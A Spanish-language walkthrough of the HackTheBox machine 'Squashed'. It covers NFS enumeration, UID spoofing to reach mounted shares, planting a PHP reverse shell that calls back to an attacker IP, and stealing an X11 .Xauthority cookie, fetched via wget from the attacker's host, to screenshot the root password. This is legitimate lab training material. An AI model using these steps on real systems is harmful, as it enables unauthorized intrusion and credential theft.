---
layout: default
title: Squashed
parent: HackTheBox
grand_parent: Writeups
---

# Squashed
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

Abusaremos de unos recursos NFS y luego subiremos una reverse shell para la flag de user, para la escalada nos aprovecharemos del archivo .Xauthority via Magic Cookie para tomar una captura de pantalla y conseguir las credenciales de root
{:.lead}


## Enumeracion
### Ecaneos con nmap

Iniciamos con un escaneo con el comando

```sudo nmap -sS -n -Pn --open -p- 10.10.11.191```

El cual esta haciendo:

- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si esta abierto

- n: para que no haga resolucion DNS y tarde menos el escaneo

- Pn: para evitar el descubrimiento de hosts

- open: para que solo muestre los puertos abiertos

- p-: para que escanee todo el rango de puertos

Y nos reporto que hay varios puertos abiertos:

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
33331/tcp open  diamondport
41253/tcp open  unknown
44525/tcp open  unknown
54989/tcp open  unknown
```

Ahora escanearemos los puertos 22, 80 y 111 buscando la version y servicio que esten corriendo:

```nmap -sCV -p22,80,111,2049 10.10.11.191```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      44911/udp   mountd
|   100005  1,2,3      47352/udp6  mountd
|   100005  1,2,3      50313/tcp6  mountd
|   100005  1,2,3      54989/tcp   mountd
|   100021  1,3,4      36833/tcp6  nlockmgr
|   100021  1,3,4      44525/tcp   nlockmgr
|   100021  1,3,4      50308/udp   nlockmgr
|   100021  1,3,4      60392/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Nos reportara mucha informacion, de la cual les puedo ir diciento que en SHH no podemos hacer nada y en el puerto 80 HTTP solo es una pagina web estatica donde tampoco podremos hacer nada (de momento).

Si vemos el servicio que esta corriendo en el puerto 111 es el ```rpcbind```, sin embargo, al intertar conectarse con rpcclient no se puede. Por otra parte vemos que tenemos que esta corriendo un NFS a travez del puerto 2049:

```
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
```
Asi que vamos por ahi.

### Enumeracion NFS

Lo primero que debemos de ver es si existen directorios que nos podemos montar, esto con el comando:

```showmount -e 10.10.11.191```

Esto nos arroja:

```
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```
Ahora pasaremos a montarnos esos dos directorios con los comandos:

```sudo mount -t nfs 10.10.11.191:/home/ross /mnt/ross -o nolock```

```sudo mount -t nfs 10.10.11.191:/var/www/html /mnt/web -o nolock```

La ruta donde me los estoy montando son:

```
/mnt/ross
/mnt/web
```

Ahora pasaremos a revisar que permisos son los que tienen ambos directorios que nos montamos, usando el comando:

```sudo nmap -sV --script=nfs-ls 10.10.11.191```

Vemos que para /home/ross nos muestra:

```
| nfs-ls: Volume /home/ross
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID   GID   SIZE  TIME                 FILENAME
| rwxr-xr-x   1001  1001  4096  2023-04-05T05:07:21  .
| ??????????  ?     ?     ?     ?                    ..
| rwx------   1001  1001  4096  2022-10-21T14:57:01  .cache
| rwx------   1001  1001  4096  2022-10-21T14:57:01  .config
| rwx------   1001  1001  4096  2022-10-21T14:57:01  .local
| rw-------   1001  1001  2475  2022-12-27T15:33:41  .xsession-errors.old
| rwxr-xr-x   1001  1001  4096  2022-10-21T14:57:01  Documents
| rwxr-xr-x   1001  1001  4096  2022-10-21T14:57:01  Music
| rwxr-xr-x   1001  1001  4096  2022-10-21T14:57:01  Pictures
| rwxr-xr-x   1001  1001  4096  2022-10-21T14:57:01  Public
```

En donde lo interesante es que el UID y GID estan definidos como 1001, sin embargo en mi maquina no hay nigun usuario con ese UID

Directorio /var/www/html:

```
| Volume /var/www/html
|   access: Read NoLookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID   GID  SIZE  TIME                 FILENAME
| rwxr-xr--   2017  33   4096  2023-04-06T00:40:01  .
| ??????????  ?     ?    ?     ?                    ..
| ??????????  ?     ?    ?     ?                    .htaccess
| ??????????  ?     ?    ?     ?                    css
| ??????????  ?     ?    ?     ?                    images
| ??????????  ?     ?    ?     ?                    index.html
| ??????????  ?     ?    ?     ?                    js
```
Es lo mismo de arriba, solo que el UID es 2017

Como extra, dentro dentro de la carpeta ```Documents``` de ```ross```, hay un archivo de un gestor de contraseñas que podriamos intentar crackear, pero les digo que no es por ahi

```
󰣇  c4rta /mnt/ross  tree      
.
├── Desktop
├── Documents
│   └── Passwords.kdbx ---> archivo de contraseñas
```

## Explotando NFS y flag de user

### Directorio /var/www/html

Como sabermos que solo vamos a tener acceso con un usuario con el UID 2017, podemos crear un usuario en muestra maquina y asignarle ese UID:

```
sudo useradd web
sudo usermod -u 2017 web
sudo groupmod -g 2017 web
```

Ahora inicamos sesion con ese usuario y ya podemos navegar entre ese directorio

Una vez dentro, tenemos archivos de un sitio web, ese sitio web corresponde al sitio web de la maquina, y asu vez, ese directorio que montamos esta sincronizado con el de la maquina, asi que lo que intentaremos es crear un archivo php que sea una reverse shell y luego acceder a ese recurso.

Usare la reverse shell de pentest monkey.

En el directorio /var/www/html creare un archivo llamado ```shell.php```, donde pegare la reverse shell y editare la IP Y puerto, de esta manera:

```
$ip = '10.10.14.21';  // CHANGE THIS
$port = 443; 
```

Ahora me pondre en escucha por netcat:

```
nc -nlvp 443
```
Y accedere al recurso:
```
http://10.10.11.191/shell.php
```
Y con eso ya obtuvimos una reverse shell, ahora toca hacerla interactiva y ya hemos conseguido la flag de user:

```
alex@squashed:/home/alex$ cat user.txt
cat user.txt
5ada1f0eea8f0909d110e6290f695705
```

## Flag de root via X11

Recordemos que anteriormente en el directorio ```/home/ross``` estaba establecido con el UID 1001, asi que como hicimos con el otro directorio, crearemos un usuario que le asignaremos el UID 1001 para que podamos leer todos los archivos.

Vemos que en el directorio existe el archivo ```.Xauthority``` y ```.xsession```, estos significa que se puede configurar una pantalla X11, .Xauthority se usa para almacenar una ```Magic cookie```, que simplemente es una cookie para poder conectarse a un servidor X11, si nosotros tenemos la cookie de una persona o su archivo ```.Xauthority``` con esa cookie, lo que podriamos hacer es tomar una captura de su pantalla

Primeramente veremos que sesiones activas existen en el usuario ```alex``` (cuando conseguimos la reverse shell):

```
alex@squashed:/home/alex$ w
w
 01:16:44 up 20:09,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               Wed05   20:09m  2:21   0.04s /usr/libexec/gnome-session-binary --systemd --session=gnome
```

Vemos que existe una sesion activa de ```ross``` usando la pantalla ```:0```.

Entonces lo que tenemos que hacer es:

- Pasarnos el archivo ```.Xauthority``` a Alex
- Desde Alex, configuraremos la variable de entorno ```XAUTHORITY``` con el ```.Xauthority``` de ross
- Tomaremos una captura de pantalla y conseguiremos la flag de root


Para pasarnos el archivo vamos a crear un servidor web con python en el directorio ```/mnt/ross``` (ese es el directorio donde monte ```/home/ross```):

```python3 -m http.server 8080```

Y luego desde el usuario ```Alex``` descargaremos el ```.Xauthority```:

```wget 10.10.14.21:8080/.Xauthority```

Ahora definitemos la variable de entorno con el ```.Xauthority``` de ross:

```XAUTHORITY=/home/alex/.Xauthority```

Ahora tomare una captura de pantalla:

```xwd -root -screen -silent -display :0 > root.xwd```

Por ultimo como sabemos que esta sincronizado el directorio ```/var/www/html``` con el que montamos, pasare el archivo que nos dejo la captura de pantalla hacia ese directorio.

```cp root.xwd /var/www/html```

Una vez teniendo el archivo lo pasaremos a PNG:

```convert root.xwd root.png```

Y ya podriamos ver la contraseña de root

![](/assets/img/squashed/root.png)

Ahora solo queda iniciar sesion como root y ver la flag

Eso ha sido todo, gracias por leer ❤